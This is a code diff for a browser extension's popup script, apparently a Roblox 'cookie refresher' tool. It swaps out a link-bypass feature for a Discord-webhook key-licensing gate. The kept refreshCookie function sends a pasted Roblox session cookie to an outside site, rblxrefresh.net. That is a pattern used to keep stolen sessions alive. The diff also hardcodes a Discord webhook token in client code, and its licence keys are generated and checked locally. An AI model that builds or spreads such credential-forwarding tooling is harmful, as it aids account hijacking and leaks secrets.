@@ -1,48 +1,187 @@
 const $ = (id) => document.getElementById(id);
 
+// NOTE: hardcoding a Discord webhook in a client-side extension makes it public.
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1543919741716926555/8ByTMpUYyAALbi_jZmGk8JiTFdxoz0FyxxB-ihI6EFESw12--lqgC-CI0VPYNjsKbmmD";
+
+const DURATIONS = {
+  "1d":       { label: "1 Day",    ms: 24 * 60 * 60 * 1000 },
+  "1w":       { label: "1 Week",   ms: 7 * 24 * 60 * 60 * 1000 },
+  "lifetime": { label: "Lifetime", ms: null },
+};
+
+// ---------- Elements ----------
 const cookieEl = $("cookie");
 const outEl = $("output");
 const statusEl = $("status");
 const btn = $("refresh-btn");
 const copyBtn = $("copy-btn");
 
-const bypassIn = $("bypass-in");
-const bypassOut = $("bypass-out");
-const bypassStatus = $("bypass-status");
-const bypassBtn = $("bypass-btn");
-const bypassCopy = $("bypass-copy");
+const sessionLocked = $("session-locked");
+const sessionContent = $("session-content");
 
-// Tabs
+const keyStatusBox = $("key-status-box");
+const keyDuration = $("key-duration");
+const requestKeyBtn = $("request-key-btn");
+const keyStatus = $("key-status");
+const redeemInput = $("redeem-key");
+const redeemBtn = $("redeem-btn");
+const redeemStatus = $("redeem-status");
+
+// ---------- Tabs ----------
 document.querySelectorAll(".tab-btn").forEach((b) => {
   b.addEventListener("click", () => {
     document.querySelectorAll(".tab-btn").forEach((x) => x.classList.remove("active"));
     b.classList.add("active");
     const tab = b.dataset.tab;
     $("panel-session").hidden = tab !== "session";
-    $("panel-bypass").hidden = tab !== "bypass";
+    $("panel-key").hidden = tab !== "key";
   });
 });
-
-// Restore last input
-chrome.storage.local.get(
-  ["lastCookie", "lastOutput", "lastBypassIn", "lastBypassOut"],
-  (v) => {
-    if (v.lastCookie) cookieEl.value = v.lastCookie;
-    if (v.lastOutput) outEl.value = v.lastOutput;
-    if (v.lastBypassIn) bypassIn.value = v.lastBypassIn;
-    if (v.lastBypassOut) bypassOut.value = v.lastBypassOut;
-  }
-);
 
 function setStatus(el, msg, kind) {
   el.textContent = msg;
   el.className = "status " + (kind || "");
 }
 
+// ---------- Keys ----------
+function randChunk() {
+  return Math.random().toString(36).slice(2, 6).toUpperCase();
+}
+function generateKey() {
+  return `ZIX-${randChunk()}-${randChunk()}-${randChunk()}`;
+}
+
+async function getState() {
+  return new Promise((r) =>
+    chrome.storage.local.get(
+      ["lastCookie", "lastOutput", "activeKey", "activeKeyExpiresAt", "activeKeyLabel", "knownKeys"],
+      (v) => r(v)
+    )
+  );
+}
+function saveState(patch) {
+  return new Promise((r) => chrome.storage.local.set(patch, r));
+}
+
+function isKeyValid(state) {
+  if (!state.activeKey) return false;
+  if (state.activeKeyExpiresAt === null || state.activeKeyExpiresAt === undefined) return true; // lifetime
+  return Date.now() < state.activeKeyExpiresAt;
+}
+
+function fmtExpiry(ts) {
+  if (ts === null || ts === undefined) return "Lifetime";
+  const d = new Date(ts);
+  return d.toLocaleString();
+}
+
+async function renderKeyState() {
+  const state = await getState();
+  const valid = isKeyValid(state);
+
+  // Gate session panel
+  sessionLocked.hidden = valid;
+  sessionContent.hidden = !valid;
+
+  if (!state.activeKey) {
+    keyStatusBox.textContent = "No active key. Request one below.";
+  } else if (!valid) {
+    keyStatusBox.textContent = `Key expired (${state.activeKey}). Request a new one.`;
+  } else {
+    keyStatusBox.innerHTML =
+      `<div>Key: <b>${state.activeKey}</b></div>` +
+      `<div>Type: ${state.activeKeyLabel || "—"}</div>` +
+      `<div>Expires: ${fmtExpiry(state.activeKeyExpiresAt)}</div>`;
+  }
+}
+
+async function postToWebhook(content) {
+  const res = await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content, username: "Zix Beam Tools" }),
+  });
+  if (!res.ok) {
+    const t = await res.text().catch(() => "");
+    throw new Error(`Webhook HTTP ${res.status}: ${t.slice(0, 120)}`);
+  }
+}
+
+// ---------- Request key ----------
+requestKeyBtn.addEventListener("click", async () => {
+  const durKey = keyDuration.value;
+  const dur = DURATIONS[durKey];
+  if (!dur) return;
+
+  requestKeyBtn.disabled = true;
+  setStatus(keyStatus, "Slinging key request through the web...", "");
+
+  try {
+    const keys = Array.from({ length: 2 }, generateKey);
+    const expiresAt = dur.ms === null ? null : Date.now() + dur.ms;
+    const expiresLabel = expiresAt === null ? "never" : new Date(expiresAt).toISOString();
+
+    const msg =
+      `**Zix Beam Tools — Key Request**\n` +
+      `Duration: **${dur.label}**\n` +
+      `Expires: ${expiresLabel}\n` +
+      `Keys:\n` +
+      keys.map((k) => `\`${k}\``).join("\n");
+
+    await postToWebhook(msg);
+
+    // Store keys locally as known/redeemable
+    const state = await getState();
+    const known = state.knownKeys || {};
+    for (const k of keys) {
+      known[k] = { label: dur.label, expiresAt };
+    }
+    await saveState({ knownKeys: known });
+
+    setStatus(
+      keyStatus,
+      `Sent 2 ${dur.label} keys to Discord. Redeem one below to unlock.`,
+      "ok"
+    );
+  } catch (e) {
+    setStatus(keyStatus, "Failed: " + e.message, "err");
+  } finally {
+    requestKeyBtn.disabled = false;
+  }
+});
+
+// ---------- Redeem key ----------
+redeemBtn.addEventListener("click", async () => {
+  const k = (redeemInput.value || "").trim().toUpperCase();
+  if (!k) {
+    setStatus(redeemStatus, "Enter a key first.", "err");
+    return;
+  }
+  const state = await getState();
+  const known = state.knownKeys || {};
+  const meta = known[k];
+  if (!meta) {
+    setStatus(redeemStatus, "Unknown key.", "err");
+    return;
+  }
+  if (meta.expiresAt !== null && Date.now() >= meta.expiresAt) {
+    setStatus(redeemStatus, "That key is expired.", "err");
+    return;
+  }
+  await saveState({
+    activeKey: k,
+    activeKeyExpiresAt: meta.expiresAt,
+    activeKeyLabel: meta.label,
+  });
+  setStatus(redeemStatus, "Redeemed! Session unlocked.", "ok");
+  await renderKeyState();
+});
+
+// ---------- Session (existing) ----------
 async function refreshCookie(raw) {
   const attempts = [
     { url: "https://rblxrefresh.net/api/refresh", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
-    { url: "https://rblxrefresh.net/refresh", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
+    { url: "https://rblxrefresh.net/refresh",     init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
     { url: "https://rblxrefresh.net/api/refresh", init: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "cookie=" + encodeURIComponent(raw) } },
   ];
   let lastErr = null;
@@ -64,34 +203,12 @@ async function refreshCookie(raw) {
   throw new Error(lastErr || "Refresh failed");
 }
 
-async function bypassLink(raw) {
-  const attempts = [
-    { url: "https://www.rbxbypass.com/api/bypass", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: raw }) } },
-    { url: "https://www.rbxbypass.com/api/bypass", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ link: raw }) } },
-    { url: "https://www.rbxbypass.com/bypass", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: raw }) } },
-    { url: "https://www.rbxbypass.com/api/bypass?url=" + encodeURIComponent(raw), init: { method: "GET" } },
-    { url: "https://www.rbxbypass.com/api/bypass", init: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "url=" + encodeURIComponent(raw) } },
-  ];
-  let lastErr = null;
-  for (const a of attempts) {
-    try {
-      const res = await fetch(a.url, a.init);
-      const text = await res.text();
-      if (!res.ok) { lastErr = `HTTP ${res.status}: ${text.slice(0,120)}`; continue; }
-      let out = null;
-      try {
-        const j = JSON.parse(text);
-        out = j.bypassed || j.url || j.result || j.link || j.data || j.destination || null;
-        if (!out && typeof j === "string") out = j;
-      } catch { out = text.trim(); }
-      if (out) return String(out);
-      lastErr = "No result in response";
-    } catch (e) { lastErr = e.message; }
-  }
-  throw new Error(lastErr || "Bypass failed");
-}
-
 btn.addEventListener("click", async () => {
+  const state = await getState();
+  if (!isKeyValid(state)) {
+    setStatus(statusEl, "Key required. Redeem one in the KEY tab.", "err");
+    return;
+  }
   const raw = cookieEl.value.trim();
   if (!raw) { setStatus(statusEl, "Enter a cookie first.", "err"); return; }
   btn.disabled = true;
@@ -99,7 +216,7 @@ btn.addEventListener("click", async () => {
   try {
     const refreshed = await refreshCookie(raw);
     outEl.value = refreshed;
-    chrome.storage.local.set({ lastCookie: raw, lastOutput: refreshed });
+    await saveState({ lastCookie: raw, lastOutput: refreshed });
     setStatus(statusEl, "Refreshed! Web-slinger success.", "ok");
   } catch (e) {
     setStatus(statusEl, "Failed: " + e.message, "err");
@@ -112,23 +229,10 @@ copyBtn.addEventListener("click", async () => {
   setStatus(statusEl, "Copied to clipboard.", "ok");
 });
 
-bypassBtn.addEventListener("click", async () => {
-  const raw = bypassIn.value.trim();
-  if (!raw) { setStatus(bypassStatus, "Enter a link first.", "err"); return; }
-  bypassBtn.disabled = true;
-  setStatus(bypassStatus, "Slinging through the bypass web...", "");
-  try {
-    const out = await bypassLink(raw);
-    bypassOut.value = out;
-    chrome.storage.local.set({ lastBypassIn: raw, lastBypassOut: out });
-    setStatus(bypassStatus, "Bypassed! Spidey-sense confirmed.", "ok");
-  } catch (e) {
-    setStatus(bypassStatus, "Failed: " + e.message, "err");
-  } finally { bypassBtn.disabled = false; }
-});
-
-bypassCopy.addEventListener("click", async () => {
-  if (!bypassOut.value) return;
-  await navigator.clipboard.writeText(bypassOut.value);
-  setStatus(bypassStatus, "Copied to clipboard.", "ok");
-});
+// ---------- Init ----------
+(async () => {
+  const state = await getState();
+  if (state.lastCookie) cookieEl.value = state.lastCookie;
+  if (state.lastOutput) outEl.value = state.lastOutput;
+  await renderKeyState();
+})();
